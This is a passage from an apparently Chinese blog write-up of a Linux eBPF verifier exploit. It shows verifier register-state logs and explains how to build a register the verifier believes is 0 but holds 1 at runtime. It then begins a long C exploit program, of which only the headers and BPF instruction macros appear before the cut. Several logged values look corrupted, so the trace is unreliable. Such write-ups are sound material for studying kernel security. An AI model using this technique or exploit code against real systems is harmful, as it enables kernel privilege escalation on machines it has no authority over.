class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9_winvP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">21</span>: (b6) <span class="keyword">if</span> w3 &lt;= <span class="number">0x1</span> <span class="keyword">goto</span> pc+<span class="number">2</span> R0_w=invP0 R3_w=invP(id=<span class="number">0</span>,u32_min_value=<span class="number">2</span>) R6_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">537</span>,imm=<span class="number">0</span>) R9_w=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">22</span>: R0_w=invP0 R3_w=invP(id=<span class="number">0</span>,u32_min_value=<span class="number">2</span>) R6_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">376</span>,imm=<span class="number">0</span>) R9_w=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">22</span>: (b7) r0 = <span class="number">1663106</span></span><br><span class="line"><span class="number">23</span>: R0_w=invP1663106 R3_w=invP(id=<span class="number">0</span>,u32_min_value=<span class="number">2</span>) R6_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ksm4,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9_w=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">23</span>: (<span class="number">95</span>) <span class="built_in">exit</span></span><br><span class="line"><span class="number">24</span>: R0=invP0 R3=invP(id=<span class="number">0</span>,smax_value=<span class="number">9223372032559808513</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x0</span>; <span class="number">0xffffffff00000001</span>),s32_min_value=<span class="number">0</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>)R6=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x10000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7=invP4294967298 R8=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">24</span>: (<span class="number">0f</span>) r6 += r3</span><br><span class="line"><span class="number">25</span>: R0=invP0 R3=invP(id=<span class="number">0</span>,smax_value=<span class="number">9223372032559808513</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x0</span>; <span class="number">0xffffffff00000001</span>),s32_min_value=<span class="number">0</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>)R6_w=invP(id=<span class="number">0</span>,smax_value=<span class="number">9223372032559808513</span>,umax_value=<span class="number">1446744069414584321</span>,var_off=(<span class="number">0x1</span>; <span class="number">0xffffffff00000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">1</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R7=invP4294967298 R8=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">25</span>: (<span class="number">07</span>) r6 += <span class="number">1</span></span><br><span class="line"><span class="number">26</span>: R0=invP0 R3=invP(id=<span class="number">0</span>,smax_value=<span class="number">9223372032559808513</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x0</span>; <span class="number">0xffffffff00000001</span>),s32_min_value=<span class="number">0</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R6_w=invP(id=<span class="number">0</span>,smin_value=<span class="number">-9223372036854775806</span>,smax_value=<span class="number">223372032559808514</span>,umin_value=<span class="number">2</span>,umax_value=<span class="number">18446744069414584322</span>,var_off=(<span class="number">0x2</span>; <span class="number">0xffffffff00000000</span>),s32_min_value=<span class="number">2</span>,s32_max_value=<span class="number">2</span>,u32_max_value=<span class="number">2</span>) R7=invP4294967298 R8=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9=invP<span class="number">-4294967296</span> R1</span><br><span class="line"><span class="number">26</span>: (<span class="number">57</span>) r6 &amp;= <span class="number">1</span></span><br><span class="line"><span class="number">27</span>: R0=invP0 R3=invP(id=<span class="number">0</span>,smax_value=<span class="number">9223372032559808513</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x0</span>; <span class="number">0xffffffff00000001</span>),s32_min_value=<span class="number">0</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R6_w=invP0 R7=invP4294967298 R8=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,s=<span class="number">5376</span>,imm=<span class="number">0</span>) R9=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">27</span>: (<span class="number">95</span>) <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>这里稍微提一嘴就是这里是如何使R3达到高32位为<code>unknown</code>，低32为<code>known</code>的效果，其实也很容易想明白，这里进行了<code>unsigned</code>的小于等于的判断，所以可以确定低32位的值，不过因为是<code>&lt;= 1</code>所以最后一位也是无法确定的，所以最终<code>.mask = 0xffffffff00000001</code>，当然直接<code>AND 0xffffffff00000001</code>应该也是可以的。</p><p>此时因为通过边界值修复了R6寄存器的<code>var_off</code>为1，但是运行时依旧为0所以此时只需要将<code>R6 + 1</code>随后<code>AND 1</code>那么在<code>verifier</code>是就会显示R6为0了，至此得到了一个运行时为1，<code>verifier</code>为0的寄存器了。</p><h3 id="综上，可得exp"><a href="#综上，可得exp" class="headerlink" title="综上，可得exp"></a>综上，可得exp</h3><p>具体利用方法和d3bpf一致，这里不再赘述，有需要可以去看 <a class="link"   href="https://cv196082.gitee.io/2023/01/06/d3bpf/" >https://cv196082.gitee.io/2023/01/06/d3bpf/<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf_common.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _BPF_DEFS_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _BPF_DEFS_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                        \</span></span><br><span class="line"><span class="meta">        .code = CODE,                          \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                        \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                        \</span></span><br><span class="line"><span class="meta">        .off = OFF,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64_RAW(DST, SRC, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                              \</span></span><br><span class="line"><span class="meta">        .code = BPF_LD | BPF_DW | BPF_IMM,           \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                              \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                              \</span></span><br><span class="line"><span class="meta">        .off = 0,                                    \</span></span><br><span class="line"><span class="meta">        .imm = (__u32)(IMM)&#125;),                       \</span></span><br><span class="line"><span class="meta">        ((struct bpf_insn)&#123;                          \</span></span><br><span class="line"><span class="meta">            .code = 0, <span class="comment">/* zero is reserved opcode */</span> \</span></span><br><span class="line"><span class="meta">            .dst_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .src_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .off = 0,                                \</span></span><br><span class="line"><span class="meta">            .imm = ((__u64)(IMM)) &gt;&gt; 32&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory load, dst_reg = *(uint *) (src_reg + off16) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory store, *(uint *) (dst_reg + off16) = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_STX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conditional jumps against immediates, if (dst_reg &#x27;op&#x27; imm32) goto pc + off16 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                       \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                       \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                         \</span></span><br><span class="line"><span class="meta">        .off = OFF,                           \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP32_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP32 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = OFF,                             \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_IMM(DST, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                        \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_IMM(DST, IMM)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    